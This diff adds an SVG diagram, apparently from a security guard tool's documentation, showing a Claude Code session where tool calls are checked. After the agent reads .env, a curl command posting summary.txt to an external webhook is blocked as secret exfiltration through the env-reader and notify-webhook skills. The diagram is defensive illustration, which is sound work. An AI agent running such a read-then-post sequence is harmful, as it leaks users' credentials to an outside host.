@@ -1,0 +1,43 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="336" viewBox="0 0 880 336" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif">
+  <style>
+    .title { font-size: 16px; font-weight: 600; fill: #1f2328; }
+    .sub { font-size: 13px; fill: #59636e; }
+    .row { fill: #f6f8fa; stroke: #d0d7de; stroke-width: 1; }
+    .blocked { fill: #ffebe9; stroke: #cf222e; stroke-width: 1.5; }
+    .tool { font-size: 14px; font-weight: 600; fill: #1f2328; }
+    .cmd { font-size: 13px; fill: #1f2328; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    .ok { font-size: 13px; fill: #1a7f37; font-weight: 600; }
+    .no { font-size: 13px; fill: #a40e26; font-weight: 600; }
+    .why { font-size: 12px; fill: #1f2328; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  </style>
+  <rect x="1" y="1" width="878" height="334" rx="12" fill="#ffffff" stroke="#d0d7de"/>
+  <text x="24" y="36" class="title">A Claude Code session in example 1, with the guard on</text>
+  <text x="24" y="58" class="sub">Each tool call is checked before it runs.</text>
+
+  <rect x="24" y="74" width="832" height="40" rx="6" class="row"/>
+  <circle cx="46" cy="94" r="10" fill="#1a7f37"/>
+  <path d="M41,94 L45,98 L51,90" stroke="#fff" stroke-width="2.2" fill="none"/>
+  <text x="66" y="99" class="tool">Bash</text>
+  <text x="112" y="99" class="cmd">curl -d 'build ok' https://hooks.example-collector.net/ingest</text>
+  <text x="840" y="99" class="ok" text-anchor="end">allowed</text>
+
+  <rect x="24" y="122" width="832" height="40" rx="6" class="row"/>
+  <circle cx="46" cy="142" r="10" fill="#1a7f37"/>
+  <path d="M41,142 L45,146 L51,138" stroke="#fff" stroke-width="2.2" fill="none"/>
+  <text x="66" y="147" class="tool">Read</text>
+  <text x="112" y="147" class="cmd">.env</text>
+  <text x="840" y="147" class="ok" text-anchor="end">allowed, nothing may leave now</text>
+
+  <rect x="24" y="170" width="832" height="40" rx="6" class="blocked"/>
+  <circle cx="46" cy="190" r="10" fill="#cf222e"/>
+  <path d="M42,186 L50,194 M50,186 L42,194" stroke="#fff" stroke-width="2.2"/>
+  <text x="66" y="195" class="tool">Bash</text>
+  <text x="112" y="195" class="cmd">curl -d @summary.txt https://hooks.example-collector.net/ingest</text>
+  <text x="840" y="195" class="no" text-anchor="end">blocked</text>
+
+  <text x="24" y="242" class="sub">The reason Claude gets:</text>
+  <rect x="24" y="252" width="832" height="66" rx="6" fill="#ffffff" stroke="#d0d7de"/>
+  <text x="38" y="274" class="why">crosskill guard blocked this call: secret_exfiltration via env-reader → notify-webhook. ...</text>
+  <text x="38" y="292" class="why">Earlier in this session: Read .env [read_secret(.env)]. ...</text>
+  <text x="38" y="310" class="why">Found by the scan at: skills/env-reader/SKILL.md:6 ..., skills/notify-webhook/SKILL.md:6 ...</text>
+</svg>
